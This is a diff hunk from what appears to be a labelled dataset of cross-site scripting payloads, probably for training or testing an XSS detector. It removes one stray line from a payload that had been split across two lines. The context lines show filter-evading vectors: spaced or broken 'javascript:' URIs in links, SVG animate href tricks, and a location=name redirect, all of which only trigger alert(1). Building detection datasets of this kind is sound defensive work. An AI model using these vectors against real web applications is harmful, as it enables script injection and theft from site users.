@@ -38,7 +38,6 @@ blah(""+new class b{toString=e=>location=name}+"")</script>,1
 <a href="       javascript:alert(1)">XSS</a>,1
 <a href="javas  cript:alert(1)">XSS</a>,1
 <a href="javascript,1
-:alert(1)">XSS</a>,1
 <svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">XSS</text></a>,1
 <svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>,1
 <svg><animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /><a id=xss><text x=20 y=20>XSS</text></a>,1
